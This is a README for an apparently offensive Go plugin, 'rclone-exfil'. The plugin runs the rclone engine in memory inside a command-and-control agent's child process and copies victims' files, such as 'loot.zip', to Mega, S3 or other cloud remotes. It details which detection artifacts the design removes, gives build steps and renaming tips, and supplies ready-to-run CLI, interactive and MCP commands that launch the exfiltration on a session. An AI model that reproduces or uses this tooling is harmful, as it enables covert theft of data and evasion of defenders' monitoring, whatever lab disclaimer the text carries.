# Exfil plugin: isolated rclone child

`agent-plugins/rclone-exfil/` is a Go plugin (c-shared DLL) that embeds the
rclone engine as a **library** and exposes it through the Go agent's PE plugin
ABI in a child process. It provides the agent's rclone exfil feature set — copy a file
or directory to a cloud remote, share link for files, obscured or plain
credentials — with none of the usual rclone process artifacts. Authorized lab
use only.

## Why a plugin

- The agent binary stays dependency-free and small; the rclone engine only
  exists on a target when the operator loads the plugin.
- The plugin is served through the existing authenticated plugin path. The
  agent fetches `/tools/plugins/<name>`, sends the DLL bytes to the child over
  stdin, and maps them there without creating a file.

## Detection surface

Eliminated by running the rclone engine in-process inside the plugin child
instead of spawning `rclone.exe`:

| Artifact | Binary flow (previous) | Plugin flow |
|----------|------------------------|------------|
| Child process `rclone.exe` (process creation events) | yes | **no rclone.exe; one agent plugin child** |
| Command line with rclone flags (`--config`, `copyto`, `--mega-pass`, …) | yes | **no command line; the plugin's JSON keys are its own** |
| `rclone.exe` file in `%TEMP%` | yes (bootstrap) | **nothing on disk** |
| rclone config file | `--config NUL` workaround | **memory-only config** (`config.SetConfigPath("")`) |
| `rclone obscure` subprocess for passwords | yes | **in-process `obscure.Reveal`** |

Still inherent to exfiltration and not addressed by the plugin: outbound TLS
to the cloud provider, provider-side logs, and rclone-related strings inside
the child process memory (visible to memory scanners). The DLL file name is
whatever the operator names it in the server plugin directory.

The rclone backend option keys inside `settings` (for example `pass` for
Mega) are the library's config schema and cannot be renamed, but they only
ever exist in memory — never in a process command line.

## Input (plugin option names)

`pe load` passes this JSON as the plugin input (our own schema, not rclone
CLI options):

```json
{
  "source":      "C:\\labs\\loot.zip",
  "account":     "vault",
  "backend":     "mega",
  "target":      "case42/",
  "settings":    {"pass": "or-rclone-obscured-value"},
  "make_link":   true,
  "link_hours":  18,
  "max_minutes": 30
}
```

| Key | Default | Meaning |
|-----|---------|---------|
| `source` | required | Local file or directory to transfer |
| `backend` | required | rclone backend type (`mega`, `s3`, `onedrive`, `local`, …) |
| `account` | `vault` | Remote section name used in memory |
| `target` | root | Destination path inside the remote |
| `settings` | `{}` | Backend options; rclone-obscured values are revealed automatically |
| `make_link` | `false` | Request a share link for single files |
| `link_hours` | `0` | Share link expiry; `0` uses the backend default |
| `max_minutes` | `30` | Transfer deadline (capped at 240) |

Directories use `sync.Sync`; single files use `operations.CopyFile` and keep
their base name on the remote.

## Output

A JSON result shaped like the agent's existing cloud upload results:

```json
{
  "remote_path": "C:\\labs\\loot.zip",
  "profile": "vault",
  "backend": "mega",
  "success": true,
  "dest": "case42/",
  "link": "https://mega.nz/…",
  "error": ""
}
```

It is posted back as a normal `output` result event (poll
`GET /api/v1/sessions/{id}/events`).

## Building

Preferred: compile on the RMM server. Only checked-in plugin sources are
built, and the DLL lands directly in the server plugin directory:

```bash
rmm_cli.py pe build rclone-exfil --output mytool.dll
```

The server needs the Go toolchain plus a mingw-w64 cross compiler
(`RMM_PLUGIN_CC` overrides the compiler name, `RMM_PLUGIN_BUILD_TIMEOUT`
the build deadline). The web UI's **Deploy plugins (Go)** panel shows the
build targets, the toolchain status, and the plugin inventory. First builds
compile every rclone backend and can take minutes; warm rebuilds are fast.

Alternative: build locally with the mingw-w64 cross compiler:

```bash
brew install mingw-w64                     # macOS
sudo apt install gcc-mingw-w64-x86-64      # Debian/Ubuntu

cd agent-plugins/rclone-exfil
./build.sh mytool.dll                      # name it freely
cp mytool.dll <server>/RMM_logs/plugins/
```

The DLL is roughly 65 MiB with all backends. To slim it, replace the
`_ "github.com/rclone/rclone/backend/all"` import in `main.go` with the
specific backends you need (for example `backend/mega`) and rebuild.

The plugin is pinned to `github.com/rclone/rclone` in
`agent-plugins/rclone-exfil/go.mod` (currently v1.75.x); `go mod tidy` after
bumping.

## Usage (the exfil command)

The plugin turns `pe load` into the exfil command. No new REST/CLI/MCP
surface is needed — reuse the plugin operator endpoints:

```bash
rmm_cli.py pe load mytool.dll --session <id> \
  '{"source":"C:\\labs\\loot.zip","backend":"mega","settings":{"pass":"…"},"target":"case42/","make_link":true}'
```

Interactive CLI:

```text
pe mytool.dll Run {"source":"C:\\labs\\loot","backend":"s3","settings":{"access_key_id":"…","secret_access_key":"…"},"target":"loot/"}
```

MCP:

```json
{"session_ref": "<id>", "plugin": "mytool.dll", "export": "Run",
 "input": "{\"source\":\"C:\\\\labs\\\\loot\",\"backend\":\"mega\",\"settings\":{\"pass\":\"…\"}}"}
```

## Function reference

New Go code in `agent-plugins/rclone-exfil/main.go`:

| Function | Role |
|----------|------|
| `Run` | Exported plugin ABI: parse input, run the job, write the JSON result |
| `exfil` | Configure the account in memory, copy or sync the source, build the result |
| `initEngine` | Switch rclone to memory-only config and silence default logging (once) |
| `writeOutput` | Store the NUL-terminated JSON result in the caller's buffer |

Types: `job` (input schema) and `result` (output schema).

## Lab validation notes

- `go test` in the plugin directory exercises the full transfer path against
  the `local` backend (file copy, directory sync, obscured settings,
  validation errors).
- The Windows DLL was compile/link-validated as a c-shared library with the
  `Run` export; validate on a lab Windows amd64 VM through the actual PE
  loader before operational use. Go allocates its TLS slot itself at runtime
  (`TlsAlloc` during runtime init), so a Go DLL does not depend on the OS
  loader's TLS-directory processing, but the manual-mapping path still
  deserves a live test.
- A plugin crash terminates the agent process; test new backends in the lab.
- The transfer blocks the beacon poll cycle for up to `max_minutes`.
